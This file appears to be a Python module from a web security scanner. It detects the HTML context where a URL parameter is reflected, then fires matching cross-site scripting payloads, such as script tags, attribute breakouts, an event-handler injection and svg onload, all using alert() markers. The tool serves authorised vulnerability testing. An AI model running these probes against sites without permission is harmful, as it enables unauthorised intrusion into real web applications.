"""xss v5 — sniper: context detection + targeted payloads"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.sniper import SniperProbe


MARKER = "omni7x9z"

# context-specific payloads (one per context)
CONTEXT_PAYLOADS = {
    "html_body": f'<script>alert("{MARKER}")</script>',
    "attr_double": f'"><script>alert("{MARKER}")</script>',
    "attr_single": f"'><script>alert('{MARKER}')</script>",
    "attr_unquoted": f' onmouseover=alert("{MARKER}") autofocus',
    "js_string": f"';alert('{MARKER}');//",
    "svg": f'<svg onload=alert("{MARKER}")>',
}


class Xss:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"q": ["test"]}

        sniper = SniperProbe(session, logger)
        base = sniper.take_baseline(target, samples=3)
        if not base:
            print("[xss] no baseline"); return {}

        print(f"[xss] sniper mode — context-aware")
        print(f"[xss] params: {list(params.keys())}")
        print()

        findings = []

        for name in params:
            print(f"[param: {name}]")

            # Phase 1: determine context by injecting marker
            context = self._detect_context(sniper, u, params, name)
            print(f"  context: {context}")

            # Phase 2: context-specific payload
            payload = CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS["html_body"])

            url_fn = lambda p, u=u, params=params, name=name: urlunparse(
                u._replace(query=urlencode({**{k: v[0] for k, v in params.items()},
                                             name: p}, doseq=True)))

            r = sniper.probe(url_fn, payload, verify_count=2)

            if r.get("hit") and r["confidence"] >= 60:
                print(f"  ✓ XSS in {context} context")
                print(f"    confidence: {r['confidence']}%")
                print(f"    evidence: {r['evidence'][:80]}")
                findings.append({
                    "param": name, "payload": payload,
                    "context": context, "confidence": r["confidence"],
                    "evidence": r["evidence"],
                })
                logger.finding("xss", "high",
                               f"{name} ({context}) conf={r['confidence']}%")
            else:
                # fallback: try all contexts
                print(f"  no hit with {context}, trying all contexts...")
                for ctx, p in CONTEXT_PAYLOADS.items():
                    r = sniper.probe(url_fn, p, verify_count=1)
                    if r.get("hit") and r["confidence"] >= 70:
                        print(f"  ✓ XSS in {ctx}")
                        findings.append({
                            "param": name, "payload": p, "context": ctx,
                            "confidence": r["confidence"],
                            "evidence": r["evidence"],
                        })
                        logger.finding("xss", "high", f"{name} ({ctx})")
                        break

        print()
        print(f"[xss] findings: {len(findings)}")
        print(f"[xss] stats: {sniper.summary()}")
        return {"findings": findings, "stats": sniper.summary()}

    def _detect_context(self, sniper, u, params, name):
        """Send marker, look where it landed in HTML."""
        marker = f"CTX{MARKER}CTX"
        url = urlunparse(u._replace(query=urlencode(
            {**{k: v[0] for k, v in params.items()}, name: marker}, doseq=True)))
        r = sniper.http.get(url)
        if not r or marker not in r.text:
            return "html_body"  # default

        idx = r.text.find(marker)
        before = r.text[max(0, idx - 50):idx]
        after = r.text[idx + len(marker):idx + len(marker) + 20]

        # check where marker landed
        if re.search(r'<script[^>]*>[^<]*$', before):
            return "js_string"
        if re.search(r'=\s*"[^"]*$', before):
            return "attr_double"
        if re.search(r"=\s*'[^']*$", before):
            return "attr_single"
        if re.search(r'<[^>]+\s+\w+=\s*$', before):
            return "attr_unquoted"
        if "<svg" in before.lower() or "<math" in before.lower():
            return "svg"
        if "<" in after and ">" in after and not after.startswith("<"):
            return "html_body"
        return "html_body"


import re
